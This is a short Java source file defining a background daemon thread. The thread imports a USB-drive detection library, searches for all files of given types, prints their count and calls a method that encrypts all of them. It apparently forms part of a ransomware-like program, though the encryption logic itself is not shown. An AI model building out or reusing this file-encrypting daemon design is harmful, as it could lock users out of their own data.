import net.samuelcampos.usbdrivedetector.USBDeviceDetectorManager;
import net.samuelcampos.usbdrivedetector.USBStorageDevice;

import java.io.File;
import java.util.List;

class DaemonThread implements Runnable {

    @Override
    public void run() {
        processSomething();
    }


    private void processSomething() {
        try {
            Logic logic = new Logic();
            logic.searchAllFileOfGivenTypes();
            System.out.println(Logic.listOfFileOfGivenTypes.size());
            logic.encryptAllFilesOfGivenType();

            Thread.sleep(0,2);
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
